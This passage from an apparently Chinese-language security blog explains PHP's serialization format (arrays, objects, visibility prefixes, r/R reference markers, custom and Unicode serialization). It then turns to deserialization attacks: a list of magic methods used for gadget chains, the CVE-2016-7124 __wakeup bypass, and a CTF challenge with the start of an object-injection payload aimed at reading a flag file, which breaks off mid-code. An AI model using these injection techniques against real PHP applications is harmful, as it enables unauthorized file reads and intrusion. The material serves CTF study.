中的复合类型有数组（array）和对象（object）两种，本章主要介绍在简单情况下这两种类型数据的序列化格式。关于嵌套定义的复合类型和自定义序列化方式的对象的序列化格式将在后面的章节详细讨论。</p><h4 id="4-1．数组的序列化"><a href="#4-1．数组的序列化" class="headerlink" title="4.1．数组的序列化"></a>4.1．数组的序列化</h4><p>数组（array）通常被序列化为：</p><p><code>a:\&lt;n&gt;:&#123;&lt;key 1&gt;&lt;value 1&gt;&lt;key 2&gt;&lt;value 2&gt;...\&lt;key n&gt;\&lt;value n&gt;&#125;</code></p><p>其中 <n> 表示数组元素的个数，&lt;key 1&gt;、&lt;key 2&gt;……<key n> 表示数组下标，&lt;value 1&gt;、&lt;value 2&gt;……<value n> 表示与下标相对应的数组元素的值。</p><p>下标的类型只能是整型或者字符串型（包括后面那种 Unicode 字符串型），序列化后的格式跟整型和字符串型数据序列化后的格式相同。</p><p>数组元素值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。</p><h4 id="4-2．对象的序列化"><a href="#4-2．对象的序列化" class="headerlink" title="4.2．对象的序列化"></a>4.2．对象的序列化</h4><p>对象（object）通常被序列化为：</p><p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125;</code></p><p>其中 <length> 表示对象的类名 <class name> 的字符串长度。<n> 表示对象中的字段1个数。这些字段包括在对象所在类及其祖先类中用 var、public、protected 和 private 声明的字段，但是不包括 static 和 const 声明的静态字段。也就是说只有实例（instance）字段。</p><p>&lt;filed name 1&gt;、&lt;filed name 2&gt;……<filed name n>表示每个字段的字段名，而 &lt;filed value 1&gt;、&lt;filed value 2&gt;……<filed value n> 则表示与字段名所对应的字段值。</p><p>字段名是字符串型，序列化后格式与字符串型数据序列化后的格式相同。</p><p>字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。</p><p>但字段名的序列化与它们声明的可见性是有关的，下面重点讨论一下关于字段名的序列化。</p><h4 id="4-3．对象字段名的序列化"><a href="#4-3．对象字段名的序列化" class="headerlink" title="4.3．对象字段名的序列化"></a>4.3．对象字段名的序列化</h4><p>var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。</p><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上</p><p><code>\0*\0</code></p><p>的前缀。这里的 \0 表示 ASCII 码为 0 的字符，而不是 \0 组合。</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上</p><p><code>\0&lt;declared class name&gt;\0</code></p><p>的前缀。这里 <declared class name> 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。</p><p>字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><hr><p>1注： 在 PHP 手册中，字段被称为属性，而实际上，在 PHP 5 中引入的用 __set、__get 来定义的对象成员更适合叫做属性。因为用 __set、__get 来定义的对象成员与其它语言中的属性的行为是一致，而 PHP 手册中所说的属性实际上在其他语言中（例如：C#）中被称为字段，为了避免混淆，这里也称为字段，而不是属性。</p><h3 id="5．嵌套复合类型的序列化"><a href="#5．嵌套复合类型的序列化" class="headerlink" title="5．嵌套复合类型的序列化"></a>5．嵌套复合类型的序列化</h3><p>上一章讨论了简单的复合类型的序列化，大家会发现对于简单的数组和对象其实也很容易。但是如果遇到自己包含自己或者 A 包含 B，B 又包含 A 这类的对象或数组时，PHP 又该如何序列化这种对象和数组呢？本章我们就来讨论这种情况下的序列化形式。</p><h4 id="5-1．对象引用和指针引用"><a href="#5-1．对象引用和指针引用" class="headerlink" title="5.1．对象引用和指针引用"></a>5.1．对象引用和指针引用</h4><p>在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。</p><p>在解释对象引用和指针引用之前，先让我们看几个例子。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SampleClass</span> </span>&#123;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$value</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SampleClass();<span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-variable">$a</span>; <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SampleClass();<span class="hljs-variable">$b</span>-&gt;value = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$b</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>这个例子的输出结果是这样的：</p><p><code>O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;r:1;&#125;</code><br><code>O:11:&quot;SampleClass&quot;:1:&#123;s:5:&quot;value&quot;;R:1;&#125;</code></p><p>大家会发现，这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1。</p><p>但是对象引用和指针引用到底有什么区别呢？</p><p>大家可以看下面这个例子：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SampleClass</span> </span>&#123;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$value</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> SampleClass();<span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-variable">$a</span>; <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SampleClass();<span class="hljs-variable">$b</span>-&gt;value = &amp;<span class="hljs-variable">$b</span>; <span class="hljs-variable">$a</span>-&gt;value = <span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>-&gt;value = <span class="hljs-number">1</span>; var_dump(<span class="hljs-variable">$a</span>);var_dump(<span class="hljs-variable">$b</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;</code></pre></div><p>大家会发现，运行结果也许出乎你的预料：</p><p>object(SampleClass)#1 (1) {<br> [“value”]=&gt;<br> int(1)<br>}<br>int(1)</p><p>改变 $a-&gt;value 的值仅仅是改变了 $a-&gt;value 的值，而改变 $b-&gt;value 的值却改变了 $b 本身，这就是对象引用和指针引用的区别。</p><p>不过很不幸的是，PHP 对数组的序列化犯了一个错误，虽然数组本身在传递时也是对象引用传递，但是在序列化时，PHP 似乎忘记了这一点，看下面的例子：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>] = <span class="hljs-variable">$a</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-number">1</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-variable">$a</span> = unserialize(serialize(<span class="hljs-variable">$a</span>));<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-string">&quot;value&quot;</span>][<span class="hljs-number">1</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;</code></pre></div><p>结果是：</p><p>1</p><p>大家会发现，将原数组序列化再反序列化后，数组结构变了。原本 $a[“value”][“value”][1] 中的值 1，在反序列化之后丢失了。</p><p>原因是什么呢？让我们输出序列化之后的结果来看一看：</p><p>$a = array();<br>$a[1] = 1;<br>$a[“value”] = $a;</p><p>echo serialize($a);</p><p>结果是：</p><p><code>a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;N;&#125;&#125;</code></p><p>原来，序列化之后，$a[“value”][“value”] 变成了 NULL，而不是一个对象引用。</p><p>也就是说，PHP 只对对象在序列化时才会生成对象引用标示（r）。对所有的标量类型和数组（也包括 NULL）序列化时都不会生成对象引用。但是如果明确使用了 &amp; 符号作的引用，在序列化时，会被序列化为指针引用标示（R）。</p><h4 id="5-2．引用标示后的数字"><a href="#5-2．引用标示后的数字" class="headerlink" title="5.2．引用标示后的数字"></a>5.2．引用标示后的数字</h4><p>在上面的例子中大家可能已经看到了，对象引用（r）和指针引用（R）的格式为：</p><p>r:<number>;<br>R:<number>;</p><p>大家一定很奇怪后面这个 <number> 是什么吧？本节我们就来详细讨论这个问题。</p><p>这个 <number> 简单的说，就是所引用的对象在序列化串中第一次出现的位置，但是这个位置不是指字符的位置，而是指对象（这里的对象是泛指所有类型的量，而不仅限于对象类型）的位置。</p><p>我想大家可能还不是很明白，那么我来举例说明一下：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassA</span> </span>&#123;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$int</span>;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$str</span>;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$bool</span>;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$obj</span>;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$pr</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ClassA();<span class="hljs-variable">$a</span>-&gt;int = <span class="hljs-number">1</span>;<span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-string">&quot;Hello&quot;</span>;<span class="hljs-variable">$a</span>-&gt;bool = <span class="hljs-literal">false</span>;<span class="hljs-variable">$a</span>-&gt;obj = <span class="hljs-variable">$a</span>;<span class="hljs-variable">$a</span>-&gt;pr = &amp;<span class="hljs-variable">$a</span>-&gt;str;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);这个例子的结果是：O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;ClassA&quot;</span>:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;int&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Hello&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;bool&quot;</span>;b:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;r:<span class="hljs-number">1</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;pr&quot;</span>;R:<span class="hljs-number">3</span>;&#125;</code></pre></div><p>在这个例子中，首先序列化的对象是 ClassA 的一个对象，那么给它编号为 1，接下来要序列化的是这个对象的几个成员，第一个被序列化的成员是 int 字段，那它的编号就为 2，接下来被序列化的成员是 str，那它的编号就是 3，依此类推，到了 obj 成员时，它发现该成员已经被序列化了，并且编号为 1，因此它被序列化时，就被序列化成了 r:1; ，在接下来被序列化的是 pr 成员，它发现该成员实际上是指向 str 成员的一个引用，而 str 成员的编号为 3，因此，pr 就被序列化为 R:3; 了。</p><p>PHP 是如何来编号被序列化的对象的呢？实际上，PHP 在序列化时，首先建立一个空表，然后每个被序列化的对象在被序列化之前，都需要先计算该对象的 Hash 值，然后判断该 Hash 值是否已经出现在该表中了，如果没有出现，就把该 Hash 值添加到这个表的最后，返回添加成功。如果出现了，则返回添加失败，但是在返回失败前先判断该对象是否是一个引用（用 &amp; 符号定义的引用），如果不是则也把 Hash 值添加到表后（尽管返回的是添加失败）。如果返回失败，则同时返回上一次出现的位置。</p><p>在添加 Hash 值到表中之后，如果添加失败，则判断添加的是一个引用还是一个对象，如果是引用，则返回 R 标示，如果是对象，则返回 r 标示。因为失败时，会同时返回上一次出现的位置，因此，R 和 r 标示后面的数字，就是这个位置。</p><h4 id="5-3．对象引用的反序列化"><a href="#5-3．对象引用的反序列化" class="headerlink" title="5.3．对象引用的反序列化"></a>5.3．对象引用的反序列化</h4><p>PHP 在反序列化处理对象引用时很有意思，如果反序列化的字符串不是 PHP 的 serialize() 本身生成的，而是人为构造或者用其它语言生成的，即使对象引用指向的不是一个对象，它也能正确地按照对象引用所指向的数据进行反序列化。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StrClass</span> </span>&#123;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>;   <span class="hljs-keyword">var</span> <span class="hljs-variable">$b</span>;&#125; <span class="hljs-variable">$a</span> = unserialize(<span class="hljs-string">&#x27;O:8:&quot;StrClass&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;r:2;&#125;&#x27;</span>); var_dump(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;运行结果：<span class="hljs-keyword">object</span>(StrClass)<span class="hljs-comment">#1 (2) &#123;</span> [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;Hello&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;Hello&quot;</span>&#125;大家会</code></pre></div><p>发现，上面的例子反序列化后，$a-&gt;b 的值与 $a-&gt;a 的值是一样的，尽管 $a-&gt;a 不是一个对象，而是一个字符串。因此如果大家用其它语言来实现序列化的话，不一定非要把 string 作为标量类型来处理，即使按照对象引用来序列化拥有相同字符串内容的复合类型，用 PHP 同样可以正确的反序列化。这样可以更节省序列化后的内容所占用的空间。</p><h3 id="6．自定义对象序列化"><a href="#6．自定义对象序列化" class="headerlink" title="6．自定义对象序列化"></a>6．自定义对象序列化</h3><h4 id="6-1．PHP-4-中自定义对象序列化"><a href="#6-1．PHP-4-中自定义对象序列化" class="headerlink" title="6.1．PHP 4 中自定义对象序列化"></a>6.1．PHP 4 中自定义对象序列化</h4><p>PHP 4 中提供了 __sleep 和 __wakeup 这两个方法来自定义对象的序列化。不过这两个函数并不改变对象序列化的格式，影响的仅仅是被序列化字段的个数。关于它们的介绍，在 PHP 手册中写的还算比较详细。这里就不再多做介绍了。</p><h4 id="6-2．PHP-5-中自定义对象序列化"><a href="#6-2．PHP-5-中自定义对象序列化" class="headerlink" title="6.2．PHP 5 中自定义对象序列化"></a>6.2．PHP 5 中自定义对象序列化</h4><p>PHP 5 中增加了接口（interface）功能。PHP 5 本身提供了一个 Serializable 接口，如果用户在自己定义的类中实现了这个接口，那么在该类的对象序列化时，就会被按照用户实现的方式去进行序列化，并且序列化后的标示不再是 O，而改为 C。C 标示的格式如下：</p><p>C:<name length>:”<class name>“:<data length>:{<data>}</p><p>其中 <name length> 表示类名 <class name> 的长度，<data length> 表示自定义序列化数据 <data> 的长度，而自定义的序列化数据 <data> 是完全的用户自己定义的格式，与 PHP 序列化格式可以完全无关，这部分数据由用户自己实现的序列化和反序列化接口方法来管理。</p><p>Serializable 接口中定义了 2 个方法，serialize() 和 unserialize($data)，这两个方法不会被直接调用，而是在调用 PHP 序列化函数时，被自动调用。其中 serialize 函数没有参数，它的返回值就是 <data> 的内容。而 unserialize($data) 有一个参数 $data，这个参数的值就是 <data> 的内容。这样大家应该就明白了，实际上接口中 serialize 方法就是让用户来自己序列化对象中的内容，序列化后的内容格式，PHP 并不关心，PHP 只负责把它充填到 <data> 中，等到反序列化时，PHP 只负责取出这部分内容，然后传给用户实现的 unserialize($data) 接口方法，让用户自己去反序列化这部分内容。</p><p>下面举个简单的例子，来说明 Serializable 接口的使用：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span><span class="hljs-class"></span>&#123;   <span class="hljs-keyword">public</span> <span class="hljs-variable">$member</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MyClass</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;     <span class="hljs-keyword">$this</span>-&gt;member = <span class="hljs-string">&#x27;member value&#x27;</span>;   &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;     <span class="hljs-keyword">return</span> wddx_serialize_value(<span class="hljs-keyword">$this</span>-&gt;member);   &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function">   </span>&#123;     <span class="hljs-keyword">$this</span>-&gt;member = wddx_deserialize(<span class="hljs-variable">$data</span>);   &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> MyClass();<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;print_r(unserialize(serialize(<span class="hljs-variable">$a</span>)));</code></pre></div><p>输出结果为（浏览器中的源代码）：</p><p>C:7:”MyClass”:90:{<wddxPacket version='1.0'><header/><data><string>member value</string></data></wddxPacket>}<br>MyClass Object<br>(<br>   [member] =&gt; member value<br>)</p><p>因此如果想用其它语言来实现 PHP 序列化中的 C 标示的话，也需要提供一种这样的机制，让用户自定义类时,能够自己在反序列化时处理 <data> 内容，否则，这些内容就无法被反序列化了。</p><h3 id="7．Unicode-字符串的序列化"><a href="#7．Unicode-字符串的序列化" class="headerlink" title="7．Unicode 字符串的序列化"></a>7．Unicode 字符串的序列化</h3><p>好了，最后再谈谈 PHP 6 中关于 Unicode 字符串序列化的问题吧。</p><p>说实话，我不怎么喜欢把字符串搞成双字节 Unicode 这种编码的东西。JavaScript 中也是用这样的字符串，因此在处理字节流的东西时，反而非常的不方便。C# 虽然也是用这种方式来编码字符串，不过还好的是，它提供了全面的编码转换机制，而且提供这种字符串到字节流（实际上是到字节数组）的转换，所以处理起来还 算是可以。但是对于不熟悉这个的人来说，转来转去就是个麻烦。</p><p>PHP 6 之前一直是按字节来编码字符串的，到了 PHP 6 突然冒出个 Unicode 编码的字符串来，虽然是可选的，但仍然让人觉得非常不舒服，如果配置不当，老的程序兼容性都成问题。</p><p>当然加了这个东西以后，许多老的与字符串有关的函数都进行了修改。序列化函数也不例外。因此，PHP 6 中增加了专门的 Unicode 字符串序列化标示 U。PHP 6 中对 Unicode 字符串的序列化格式如下：</p><p>U:<length>:”<unicode string>“;</p><p>这里 <length> 是指原 Unicode String 的长度，而不是 <unicode string> 的长度，因为 <unicode string> 是经过编码以后的字节流了。</p><p>但是还有一点要注意，<length> 尽管是原 Unicode String 的长度，但是也不是只它的字节数，当然也不完全是指它的字符数，确切的说是之它的字符单位数。因为 Unicode String 中采用的是 UTF16 编码，这种编码方式使用 16 位来表示一个字符的，但是并不是所有的都是可以用 16 位表示的，因此有些字符需要两个 16 位来表示一个字符。因此，在 UTF16 编码中，16 位字符算作一个字符单位，一个实际的字符可能就是一个字符单位，也有可能由两个字符单位组成。因此， Unicode String 中字符数并不总是等于字符单位数，而这里的 <length> 指的就是字符单位数，而不是字符数。</p><p>那 <unicode string> 又是怎样被编码的呢？实际上，它的编码也很简单，对于编码小于 128 的字符（但不包括 \），按照单个字节写入，对于大于 128 的字符和 \ 字符，则转化为 16 进制编码的字符串，以 \ 作为开头，后面四个字节分别是这个字符单位的 16 进制编码，顺序按照由高位到低位排列，也就是第 16-13 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 12-9 位作为第二个字节，第 8-5 位作为第三个字节，最后的第 4-1 位作为第四个字节。依次编码下来，得到的就是 <uncode string> 的内容了。</p><p>我认为对于其他语言来说，没有必要实现这种序列化方式，因为用这种方式序列化的内容，对于目前的主流 PHP 服务器来说都是不支持的，不过倒是可以实现它的反序列化，这样将来即使跟 PHP 6 进行数据交换，也可以互相读懂了。</p><h2 id="0x02-php反序列化魔术方法"><a href="#0x02-php反序列化魔术方法" class="headerlink" title="0x02 php反序列化魔术方法"></a>0x02 php反序列化魔术方法</h2><h3 id="方法列表"><a href="#方法列表" class="headerlink" title="方法列表"></a>方法列表</h3><div class="hljs code-wrapper"><pre><code class="hljs php">起点：__destruct() <span class="hljs-comment">//对象被销毁时触发</span>__wakeup() <span class="hljs-comment">//unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span>__toString() <span class="hljs-comment">//__toString() 方法用于一个类被当成字符串时应怎样回应</span>   中间跳板：__call() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span>__callStatic() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span>__get() <span class="hljs-comment">//用于从不可访问的属性读取数据</span>__set() <span class="hljs-comment">//用于将数据写入不可访问的属性</span>__isset() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span>__unset() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span>__invoke() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span>__toString() <span class="hljs-comment">//</span>终点：__call: 调用不可访问或不存在的方法时被调用call_user_func、call_user_func_array等代码执行点    其他：__construct()<span class="hljs-comment">//创建对象时触发0</span>__sleep() <span class="hljs-comment">//对象被序列化之前触发</span></code></pre></div><h3 id="toString-方法触发条件"><a href="#toString-方法触发条件" class="headerlink" title="__toString 方法触发条件"></a>__toString 方法触发条件</h3><p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p><blockquote><p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p><p>(2)反序列化对象与字符串连接时</p><p>(3)反序列化对象参与格式化字符串时</p><p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p><p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p><p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p><p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p><p>(8)反序列化的对象作为 class_exists() 的参数的时候</p><p>(9)作为file_exists()函数时也会触发</p></blockquote><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p><strong>CVE-2016-7124</strong></p><p>在PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性(变量)数大于实际的个数时， <code>__wakeup()</code> 不会被执行。</p><h2 id="0x03-php反序列化对象注入"><a href="#0x03-php反序列化对象注入" class="headerlink" title="0x03 php反序列化对象注入"></a>0x03 php反序列化对象注入</h2><h3 id="basic：安恒月赛web"><a href="#basic：安恒月赛web" class="headerlink" title="basic：安恒月赛web"></a>basic：安恒月赛web</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>show_source(<span class="hljs-string">&quot;index.php&quot;</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;gqy&#x27;</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$c</span> = <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;b;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//flag.php</span>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;c);        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<span class="hljs-comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><span class="hljs-variable">$b</span> = unserialize(read(write(serialize(<span class="hljs-variable">$a</span>))));</code></pre></div><p>原理是通过对username长度的减小，导致username反序列化时将password部分视为自己的部分，则我们可以构造自己的序列化语句，注入自己想要的对象。</p><p><strong>payload</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;gqy&#x27;</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;c = <span 